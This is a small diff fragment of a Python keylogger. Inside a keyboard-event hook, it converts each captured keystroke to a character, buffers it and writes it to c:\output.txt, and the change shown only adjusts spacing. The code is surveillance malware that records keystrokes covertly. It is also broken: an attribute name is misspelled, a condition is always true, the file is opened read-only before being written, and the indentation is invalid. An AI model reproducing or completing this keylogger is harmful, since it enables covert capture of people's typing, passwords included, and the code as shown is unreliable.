@@ -12,8 +12,8 @@ def OnKeyboardEvent(event):
         _exit(1)
     if event.Asccii != 0 or 8:
         f= open('c:\output.txt','r')
-        keylogs=chr(event.Ascii)
-        if  event.Ascii==13:
+        keylogs = chr(event.Ascii)
+        if  event.Ascii == 13:
         buffer += keylogs
         f.write(buffer)
         f.close()
